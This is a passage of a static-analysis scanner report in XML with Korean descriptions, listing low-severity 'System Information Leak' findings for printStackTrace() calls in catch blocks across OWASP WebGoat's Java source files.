                            <Abstract>LessonTracker.java의 load() 함수는 254 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>254</LineStart>
<Snippet>	{
	    System.out.println("Failed to load lesson state for " + screen);
	    e.printStackTrace();
	}
	finally</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B227CC5643407A75A63DAD656CCB9DC6" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>FindProfile.java의 findEmployeeProfile() 함수는 187 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>187</LineStart>
<Snippet>	{
	    s.setMessage("Error finding employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D9886F39472E4FB32B12FB9ED7A42A23" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Course.java의 Course() 함수는 72 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Course.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Course.java</FilePath>
<LineStart>72</LineStart>
<Snippet>		{
		    System.out.println("Error loading WebGoat properties");
		    e.printStackTrace();
		}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EC550B01611ECF96AB4E36233F98E1DA" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Challenge2Screen.java의 resetWebPage() 함수는 441 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>441</LineStart>
<Snippet>	catch (Exception e)
	{
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D7EA539980EA0892CA2126A54762616A" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 함수는 204 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>204</LineStart>
<Snippet>	    catch (Throwable thr)
	    {
		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BD4FADFC5F19C155B261ECC46F46E82D" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.java의 getEmployeeProfile() 함수는 125 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>125</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7D6003CBCB0DCF48E600ED712C83AABF" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SqlStringInjection.java의 injectableQuery() 함수는 152 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>152</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F40DFD7D0A6A3177917B8D561E6CDCC9" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest_BACKUP() 함수는 452 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>452</LineStart>
<Snippet>		System.out.println("Authorization failure");
		setCurrentAction(s, ERROR_ACTION);
		ue2.printStackTrace();
	    }
	    catch (Exception e)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F2A3B37C92D64B9A4D3A13851DF8D76E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ProductsAdminScreen.java의 createContent() 함수는 88 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ProductsAdminScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ProductsAdminScreen.java</FilePath>
<LineStart>88</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D613F7CF5C9DCE819D72E14B4C1612FB" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AbstractLesson.java의 isAuthorized() 함수는 807 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>807</LineStart>
<Snippet>	    {
		s.setMessage("Error authorizing");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D1157449ECBB492F0958DEFDB268BDCE" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile() 함수는 166 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>166</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D76FD51A11E5483E308232F0748769C5" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AbstractLesson.java의 getFileText() 함수는 479 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>479</LineStart>
<Snippet>	{
	    System.out.println(e);
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1628D80D60254DD5FE7AF2F02C279A5B" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.java의 getEmployeeProfile_BACKUP() 함수는 189 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>189</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D60D775DBDAE54DDEBF316C5113E73DC" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 createEmployeeProfile_BACKUP() 함수는 387 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>387</LineStart>
<Snippet>	    {
		s.setMessage("Error updating employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F7FD358E0D1F0374731F1FA9D063D96F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>FindProfile.java의 handleRequest() 함수는 126 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>126</LineStart>
<Snippet>		{
		    System.out.println("Internal server error");
		    ue2.printStackTrace();
		}
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="047AD488FEFFFA0C26F978A64B811539" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Encoding.java의 main() 함수는 774 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>774</LineStart>
<Snippet>		catch ( Exception e )
		{
			e.printStackTrace();
		}
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7865EB7B5AC47B29248E8C5025A008B0" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 handleRequest() 함수는 96 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>96</LineStart>
<Snippet>		{
		    System.out.println("Internal server error");
		    ue2.printStackTrace();
		}
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="21A8BD721CDE61C4EE753B32957EA7C8" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 getNextUID() 함수는 263 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>263</LineStart>
<Snippet>	{
	    // TODO Auto-generated catch block
	    e.printStackTrace();
	}
	return uid + 1;</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F816B701BF42B2D5F9B436A63C987F2E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.java의 getAllEmployees() 함수는 121 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>121</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employees");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="35E084BA77E09CEA853C2E8B67EC5A90" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>FindProfile.java의 findEmployeeProfile() 함수는 219 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>219</LineStart>
<Snippet>	{
	    s.setMessage("Error finding employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7608F03C2C01ADB55C091F61822D3207" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SQLInjection.java의 handleRequest() 함수는 367 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>367</LineStart>
<Snippet>		// All other errors send the user to the generic error page
		System.out.println("handleRequest() error");
		e.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="93CD6DEBF68343122976265824799022" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 createUserDataTable() 함수는 307 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>307</LineStart>
<Snippet>	{
	    System.out.println("Error creating user database");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0C519A9DA8C7ECBC38BFA1BFE8776F64" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WSDLScanning.java의 createContent() 함수는 264 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>264</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	return (ec);</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FC1E4C3D52D781762C0317B5BBFBAA8F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile_BACKUP() 함수는 206 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>206</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F5CE104ADE787D309B188DA800E168D9" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 createUserAdminTable() 함수는 255 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>255</LineStart>
<Snippet>	{
	    System.out.println("Error creating user admin database");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F570B583EF594B28853E556BE72B33B8" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ReflectedXSS.java의 createContent() 함수는 222 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>222</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	return (ec);</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0278C28651A419EA7D7D5DB87A1FB695" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 handleRequest() 함수는 100 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>100</LineStart>
<Snippet>		{
		    System.out.println("Internal server error");
		    ue2.printStackTrace();
		}
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0010C1C949B6B1146790E9BA51866F0D" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CrossSiteScripting.java의 handleRequest() 함수는 379 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>379</LineStart>
<Snippet>		s.setMessage("You are not authorized to perform this function");
		System.out.println("Authorization failure");
		ue2.printStackTrace();
	    }
	    catch (Exception e)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="05B7CDDF96E7DFE39C750A2146B40FF2" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 changeEmployeeProfile() 함수는 181 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>181</LineStart>
<Snippet>	    {
		s.setMessage("Error updating employee profile");
		sqle.printStackTrace();
	    }
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DD063791D0680D5C9FF93F0599D7712B" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.java의 getAllEmployees_BACKUP() 함수는 169 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>169</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employees");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F320CD0D64400B8E8CD55AB226B1808C" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WeakAuthenticationCookie.java의 createContent() 함수는 197 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>197</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3D85ED8EA02BD2FB40285F67BE1CDE88" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 createWeatherDataTable() 함수는 406 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>406</LineStart>
<Snippet>	{
	    System.out.println("Error creating weather database");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EA9B69789F87214E21A83B60748AE677" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>XPATHInjection.java의 createContent() 함수는 212 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>212</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	return ec;</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
